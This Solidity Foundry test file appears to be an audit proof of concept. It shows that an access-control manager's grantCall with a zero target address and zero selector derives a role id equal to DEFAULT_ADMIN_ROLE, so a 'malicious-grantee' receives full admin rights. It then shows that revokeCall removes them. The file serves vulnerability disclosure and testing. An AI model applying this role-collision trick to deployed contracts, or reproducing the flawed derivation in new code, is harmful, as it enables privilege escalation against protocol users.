// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/console2.sol";

import "./StrataProtocolDeploymentBase.sol";

contract AccessControlManagerGrantCallTest is StrataProtocolDeploymentBase {
    string constant RESET = "\x1b[0m";
    string constant CYAN = "\x1b[36m";
    string constant YELLOW = "\x1b[33m";
    string constant GREEN = "\x1b[32m";
    string constant RED = "\x1b[31m";

    function pocGrantCallFallbackSelectorGivesDefaultAdmin() public {
        _deployStrataStack();

        address attacker = makeAddr("malicious-grantee");
        vm.label(attacker, "GrantCallGrantee");

        bytes32 defaultAdminRole = acm.DEFAULT_ADMIN_ROLE();
        bytes4 emptySelector = bytes4(0);

        console2.log(string.concat(CYAN, "[setup] access control manager:", RESET), address(acm));
        console2.log(string.concat(CYAN, "[setup] default admin role id:", RESET));
        console2.logBytes32(defaultAdminRole);

        bool preHasAdmin = acm.hasRole(defaultAdminRole, attacker);
        console2.log(
            string.concat(YELLOW, "[check] attacker has DEFAULT_ADMIN_ROLE before grant:", RESET),
            preHasAdmin
        );
        assertFalse(preHasAdmin, "attacker should not start with admin rights");

        console2.log(
            string.concat(GREEN, "[action] owner calls grantCall(address(0), bytes4(0), attacker)", RESET)
        );
        vm.startPrank(owner);
        acm.grantCall(address(0), emptySelector, attacker);
        vm.stopPrank();

        bool postHasAdmin = acm.hasRole(defaultAdminRole, attacker);
        console2.log(
            string.concat(RED, "[result] attacker has DEFAULT_ADMIN_ROLE after grant:", RESET),
            postHasAdmin
        );
        assertTrue(postHasAdmin, "grantCall should not hand out DEFAULT_ADMIN_ROLE, but it does");

        uint32 lowSelector;
        assembly {
            lowSelector := emptySelector
        }
        bytes32 derivedRole =
            (bytes32(uint256(uint160(address(0)))) << 96) |
            bytes32(uint256(lowSelector));
        console2.log(string.concat(CYAN, "[info] roleFor(address(0), bytes4(0)) =>", RESET));
        console2.logBytes32(derivedRole);
        assertEq(derivedRole, defaultAdminRole, "derived role id equals DEFAULT_ADMIN_ROLE");

        console2.log(string.concat(GREEN, "[cleanup] revoking same call path to show symmetry", RESET));
        vm.prank(owner);
        acm.revokeCall(address(0), emptySelector, attacker);

        bool postRevokeHasAdmin = acm.hasRole(defaultAdminRole, attacker);
        console2.log(
            string.concat(YELLOW, "[check] attacker still has DEFAULT_ADMIN_ROLE after revoke:", RESET),
            postRevokeHasAdmin
        );
        assertFalse(postRevokeHasAdmin, "revokeCall removes the unintended DEFAULT_ADMIN_ROLE grant");
    }
}
